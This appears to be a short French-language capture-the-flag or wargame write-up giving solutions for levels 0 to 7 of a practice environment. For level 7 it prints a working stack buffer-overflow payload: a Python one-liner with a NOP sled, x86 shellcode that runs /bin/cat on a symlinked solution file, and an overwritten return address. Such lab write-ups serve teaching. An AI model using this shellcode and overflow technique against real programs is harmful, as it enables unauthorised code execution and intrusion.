# Pour les solutions du level 0 -5:

-Tout d'abord,je suis entre dans /home/level puis j'execute la commande grep -rn "solution" et les solotion du level 0,1,2,3,5 s'affiche .Pour le level 4 j'ai change de l'emplacement.
Je suis entre dans => ~ puis /home/level/04_kwisatz et dans ce dossier il y a deux fichiers qui s'appelent README.txt ,README2.md.La solution du level 4 se trouve dans le README2.md(chmod +r)

# Pour le level 07:
	-On crée un lien symbolique vers la solution.txt en direction vers le lien du travail.
*/ ln -s /home/level/tropic/7/solution.txt ./lk
	-Puis, on execute ce script python:
*/ `python -c "print '\x90'*(312-33)+'1\xc0\x99Rh/cath/bin\x89\xe3Rh./lk\x89\xe1\xb0\x0bRQS\x89\xe1\xcd\x80'+'\xd2\x84\x04\x08'"`
